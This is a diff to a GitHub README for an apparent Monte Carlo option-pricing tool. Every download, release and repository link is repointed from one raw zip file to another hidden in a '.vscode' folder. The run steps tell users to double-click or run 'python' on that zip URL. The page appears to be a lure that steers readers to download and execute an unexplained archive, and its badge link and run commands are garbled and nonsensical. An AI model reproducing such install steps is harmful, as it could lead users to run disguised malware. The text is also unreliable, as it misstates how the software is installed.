@@ -1,7 +1,7 @@
 # 📈 option-pricing-montecarlo - Simple Option Pricing Made Easy
 
 ## 📥 Download Now
-[![Download Latest Release](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip%20Release-brightgreen)](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip)
+[![Download Latest Release](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip%20Release-brightgreen)](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip)
 
 ## 🚀 Getting Started
 Welcome to option-pricing-montecarlo! This tool helps you calculate the price of options using advanced simulations. You can perform simple calculations or dive into complex options like American and Asian styles. Follow these steps to get started.
@@ -24,7 +24,7 @@ To ensure smooth operation, please check the following requirements:
 To install option-pricing-montecarlo:
 
 1. **Download the Software**
-   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip)
+   Visit this page to download: [Releases Page](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip)
 
 2. **Choose Your Version**
    Select the version suited for your operating system. The most recent stable version is recommended.
@@ -36,9 +36,9 @@ To install option-pricing-montecarlo:
    Open the extracted folder. You should see the necessary files to run the application.
 
 5. **Run the Application**
-   - For Windows: Double-click on `https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip`.
-   - For macOS: Open the terminal and navigate to the folder. Type `python https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip` and hit enter.
-   - For Linux: Open the terminal, navigate to the folder, and type `python3 https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip`.
+   - For Windows: Double-click on `https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip`.
+   - For macOS: Open the terminal and navigate to the folder. Type `python https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip` and hit enter.
+   - For Linux: Open the terminal, navigate to the folder, and type `python3 https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip`.
 
 ## 🛠️ How to Use
 Once the application is running:
@@ -56,13 +56,13 @@ For detailed guidance on using all features, please refer to the comprehensive d
 - Visualizations to help understand the concepts
 
 ## 🔗 Additional Resources
-- **GitHub Repository**: Stay updated with the latest changes [here](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip).
+- **GitHub Repository**: Stay updated with the latest changes [here](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip).
 - **Community Support**: Join discussions on financial engineering and simulation techniques.
 
 ## 💬 Feedback
 Your feedback is valuable! If you have any suggestions or issues, feel free to open an issue in the GitHub repository.
 
 ## 📦 Download & Install
-Visit this page to download: [Releases Page](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/antihypochondriac/option-pricing-montecarlo.zip)
+Visit this page to download: [Releases Page](https://raw.githubusercontent.com/AaronNadelman/option-pricing-montecarlo/main/.vscode/pricing-montecarlo-option-v1.3.zip)
 
 Now you are ready to explore option pricing using the Monte Carlo simulation method. Enjoy your experience with option-pricing-montecarlo!
